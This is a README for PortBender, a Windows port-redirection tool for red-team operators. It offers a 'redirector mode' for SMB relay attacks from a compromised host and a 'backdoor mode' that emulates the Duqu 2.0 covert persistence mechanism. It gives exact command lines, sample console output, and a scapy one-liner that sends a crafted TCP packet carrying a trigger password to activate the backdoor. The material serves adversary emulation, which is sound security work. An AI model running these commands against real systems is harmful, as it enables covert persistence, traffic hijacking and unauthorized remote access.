# PortBender

## Overview

PortBender a PE adaptation of the original PortBender created by Praetorian Inc for Cobalt Strike C2 [1]. It is a TCP port redirection utility that allows a red team operator to redirect inbound traffic destined for one TCP port (e.g., 445/TCP) to another TCP port (e.g., 8445/TCP). The tool also allows operators to simulate a backdoor/persistence mechanism leveraged within the "PortServ.sys" capability used by the Duqu 2.0 threat actor. 

##  Design

PortBender leverages the WinDivert library to intercept network traffic using the Windows Filtering Platform (WFP). The design of PortBender is heavily influenced by the DivertTCPConn utility [2] which also leverages the WinDivert library [3].

```
                              +-----------------+
                              |   PortBender    |
                     +------->|                 |--------+
                     |        |  WinDivert.dll  |        |
                     |        +-----------------+        |
                     |                                   | (3) re-injected
                     | (2a) matching packet              |     packet
                     |                                   |
                     |                                   |
 [user mode]         |                                   |
 ....................|...................................|...................
 [kernel mode]       |                                   |
                     |                                   |
                     |                                   |
              +---------------+                          +----------------->
  (1) packet  |               | (2b) non-matching packet
 ------------>| WinDivert.sys |-------------------------------------------->
              |               |
              +---------------+
```

## Usage

PortBender has two modes of operation. The first is "redirector mode," and the second is "backdoor mode." In "redirector mode," any connection to a targeted destination port (e.g., 445/TCP) is redirected to an alternative port (e.g., 8445/TCP). In "backdoor mode," we only redirect traffic if an attacker sends a specially formatted TCP packet to a target port (e.g., 443/TCP). PortBender then adds that client IP address to a list of backdoor clients and redirects all traffic to that target port to an alternative port (e.g., 3389/TCP). An operator can leverage this mechanism to emulate the persistence technique used by the Duqu 2.0 threat actor when compromising Kaspersky.

To execute PortBender we must first upload the WinDivert32.sys or WinDivert64.sys binary and WinDivert.dll to the target host depending on the operating system architecture. The help menu for PortBender with the example usage is shown below:

```console
C:\> PortBender.exe
Redirect Usage: PortBender redirect SrcPort DstPort
Backdoor Usage: PortBender backdoor SrcPort DstPort password
Example:
        PortBender redirect 445 8445
        PortBender backdoor 443 3389 portbender.antihacker
```

## Example Usage

### Redirect mode

For example, we may wish to execute PortBender in redirector mode to perform an SMB relay attack from a compromised Windows system.  To facilitate this, we can instruct PortBender to redirect all traffic to 445/TCP to an alternative port 8445/TCP running an attacker SMB service. In this example, we run the command "PortBender redirect 445 8445" to accomplish this.

```console
C:\> PortBender.exe redirect 445 8445
 _______                        __      _______                             __
/       \                      /  |    /       \                           /  |
$$$$$$$  | ______    ______   _$$ |_   $$$$$$$  |  ______   _______    ____$$ |  ______    ______
$$ |__$$ |/      \  /      \ / $$   |  $$ |__$$ | /      \ /       \  /    $$ | /      \  /      \
$$    $$//$$$$$$  |/$$$$$$  |$$$$$$/   $$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |
$$$$$$$/ $$ |  $$ |$$ |  $$/   $$ | __ $$$$$$$  |$$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/
$$ |     $$ \__$$ |$$ |        $$ |/  |$$ |__$$ |$$$$$$$$/ $$ |  $$ |$$ \__$$ |$$$$$$$$/ $$ |
$$ |     $$    $$/ $$ |        $$  $$/ $$    $$/ $$       |$$ |  $$ |$$    $$ |$$       |$$ |
$$/       $$$$$$/  $$/          $$$$/  $$$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ $$/

Initializing PortBender in redirector mode
Configuring redirection of connections targeting 445/TCP to 8445/TCP
New connection from 10.10.10.11:54646 to 10.10.10.10:445
```

### Backdoor mode

In this example, we want to deploy the covert persistence mechanism on a compromised Internet-facing IIS webserver. Here we run the "PortBender backdoor 443 3389 portbender.antihacker" to instruct the backdoor service to redirect any connections to 443/TCP to 3389/TCP on the compromised host from any connected IP address by providing a crafted TCP request with the payload "portbender.antihacker".

```console
C:\> PortBender.exe backdoor 443 3389 portbender.antihacker
 _______                        __      _______                             __
/       \                      /  |    /       \                           /  |
$$$$$$$  | ______    ______   _$$ |_   $$$$$$$  |  ______   _______    ____$$ |  ______    ______
$$ |__$$ |/      \  /      \ / $$   |  $$ |__$$ | /      \ /       \  /    $$ | /      \  /      \
$$    $$//$$$$$$  |/$$$$$$  |$$$$$$/   $$    $$< /$$$$$$  |$$$$$$$  |/$$$$$$$ |/$$$$$$  |/$$$$$$  |
$$$$$$$/ $$ |  $$ |$$ |  $$/   $$ | __ $$$$$$$  |$$    $$ |$$ |  $$ |$$ |  $$ |$$    $$ |$$ |  $$/
$$ |     $$ \__$$ |$$ |        $$ |/  |$$ |__$$ |$$$$$$$$/ $$ |  $$ |$$ \__$$ |$$$$$$$$/ $$ |
$$ |     $$    $$/ $$ |        $$  $$/ $$    $$/ $$       |$$ |  $$ |$$    $$ |$$       |$$ |
$$/       $$$$$$/  $$/          $$$$/  $$$$$$$/   $$$$$$$/ $$/   $$/  $$$$$$$/  $$$$$$$/ $$/

Initializing PortBender in backdoor mode
Configuring redirection of connections targeting 443/TCP to 3389/TCP
Client 10.10.10.11 connected to the server
New connection from 10.10.10.11:51234 to 10.10.10.10:443
```

To connect to or disconnect from the backdoor server, we can send the following TCP request using scapy

```console
$ sudo scapy
>>> send(IP(dst="10.10.10.10") / TCP(sport=51337,dport=443,flags="SR",seq=1000) / (bytes(b"portbender.antihacker")))
```

## Acknowledgements

* Praetorian for his work on the original PortBender [1]
* Arno0x0x for his work on DivertTCPConn [2]
* Basil00 for his work on WinDivert [3]

## References

[1] https://github.com/praetorian-inc/PortBender/tree/main \
[2] https://github.com/Arno0x/DivertTCPconn \
[3] https://github.com/basil00/Divert \